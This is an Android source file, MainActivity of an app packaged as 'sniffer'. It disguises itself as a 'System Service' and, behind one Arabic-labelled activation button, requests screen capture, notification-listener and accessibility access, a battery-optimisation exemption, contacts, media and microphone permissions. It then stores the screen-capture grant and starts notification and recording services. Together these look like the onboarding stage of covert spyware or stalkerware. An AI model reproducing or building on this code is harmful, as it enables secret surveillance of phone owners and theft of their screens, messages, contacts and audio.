package com.v8.global.sniffer;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.Gravity;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_MEDIA_PROJECTION = 100;
    private static final int REQUEST_CODE_PERMISSIONS = 101;
    private Button btn;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setBackgroundColor(0xFF121212);

        TextView title = new TextView(this);
        title.setText("System Service");
        title.setTextColor(0xFFFFFFFF);
        title.setTextSize(24);
        title.setGravity(Gravity.CENTER);
        
        btn = new Button(this);
        btn.setText("تفعيل الخدمة بالكامل");
        btn.setTextSize(18);
        btn.setOnClickListener(v -> requestAllPermissions());

        layout.addView(title);
        layout.addView(btn);
        setContentView(layout);
    }

    private void requestAllPermissions() {
        // 1. إذن تسجيل الشاشة
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            MediaProjectionManager projectionManager = 
                (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            startActivityForResult(
                projectionManager.createScreenCaptureIntent(),
                REQUEST_MEDIA_PROJECTION
            );
        }
        
        // 2. تجاهل تحسين البطارية
        Intent batteryIntent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
        batteryIntent.setData(Uri.parse("package:" + getPackageName()));
        startActivity(batteryIntent);
        
        // 3. صلاحية الإشعارات
        startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
        
        // 4. صلاحية الوصول
        startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
        
        // 5. أذونات التخزين للملفات
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            requestPermissions(new String[]{
                android.Manifest.permission.READ_MEDIA_IMAGES,
                android.Manifest.permission.READ_MEDIA_VIDEO,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.RECORD_AUDIO
            }, REQUEST_CODE_PERMISSIONS);
        } else {
            requestPermissions(new String[]{
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.RECORD_AUDIO
            }, REQUEST_CODE_PERMISSIONS);
        }
        
        Toast.makeText(this, "تم طلب جميع الأذونات", Toast.LENGTH_LONG).show();
    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == REQUEST_MEDIA_PROJECTION) {
            if (resultCode == Activity.RESULT_OK) {
                // حفظ إذن تسجيل الشاشة
                SharedPreferences prefs = getSharedPreferences("screen_capture", MODE_PRIVATE);
                prefs.edit()
                    .putInt("resultCode", resultCode)
                    .putString("data", data.toUri(0))
                    .apply();
                
                btn.setText("✅ تم التفعيل - الخدمة تعمل");
                Toast.makeText(this, "تم تفعيل تسجيل الشاشة", Toast.LENGTH_SHORT).show();
                
                // بدء الخدمات
                startService(new Intent(this, NotificationService.class));
                startService(new Intent(this, RecordingAccessibilityService.class));
            }
        }
    }
}
